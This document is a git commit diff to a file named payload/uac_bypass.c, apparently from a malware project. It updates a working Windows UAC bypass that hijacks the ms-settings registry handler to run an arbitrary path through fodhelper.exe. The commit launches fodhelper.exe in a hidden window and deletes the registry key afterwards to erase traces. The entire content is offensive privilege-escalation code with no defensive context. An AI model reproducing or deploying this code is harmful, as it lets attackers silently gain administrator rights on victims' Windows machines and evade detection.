f494344da1ae25198b7d14a715e6b416ca5d987f
will-the-creator <hoopa05.cascade@icloud.com>
2025-07-21 21:56:02 -0600

    updated uac

--- payload/uac_bypass.c
+++ payload/uac_bypass.c
@@ -1,11 +1,20 @@
 void UAC_bypass(const char *path) {
     HKEY k;
-    RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\shell\\open\\command")
-	RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\shell\\open\\command", 0, 0, 0, KEY_WRITE, 0, &k, 0);
+    RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\shell\\open\\command", 0, 0, 0, KEY_WRITE, 0, &k, 0);
     RegSetValueExA(k, 0, 0, REG_SZ, (BYTE*)path, lstrlenA(path) + 1);
     RegSetValueExA(k, "DelegateExecute", 0, REG_SZ, (const BYTE*)"", 1);
     RegCloseKey(k);
-	ShellExecuteA(0, "open", "fodhelper.exe", 0, 0, SW_HIDE);
+	//instead of just opening fodhelper.exe
+	STARTUPINFOA si = { 0 };
+	PROCESS_INFORMATION pi = { 0 };
+	si.cb = sizeof(si);
+	si.dwFlags = STARTF_USESHOWWINDOW;
+	si.wShowWindow = SW_HIDE;
+
+	CreateProcessA("C:\\Windows\\System32\\fodhelper.exe", 0, 0, 0, FALSE, 0, 0, 0, &si, &pi);
+
+	Sleep(500);
+	RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\shell\\open\\command");
 
 }
 // 0, = NULL 
